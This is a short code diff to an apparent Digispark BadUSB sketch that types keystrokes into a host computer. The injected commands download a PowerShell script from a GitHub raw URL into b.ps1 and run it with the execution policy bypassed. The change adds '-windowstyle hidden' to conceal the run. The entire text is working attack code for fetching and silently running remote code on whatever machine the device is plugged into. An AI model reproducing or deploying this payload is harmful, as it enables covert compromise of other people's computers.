@@ -22,7 +22,7 @@ void setup()
  DigiKeyboard.println("echo (wget 'https://raw.githubusercontent.com/mbauer599/rubberduckyrun/master/run').content > b.ps1");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(50);
- DigiKeyboard.println("powershell -ExecutionPolicy ByPass -File b.ps1");
+ DigiKeyboard.println("powershell -windowstyle hidden -ExecutionPolicy ByPass -File b.ps1");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.println("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
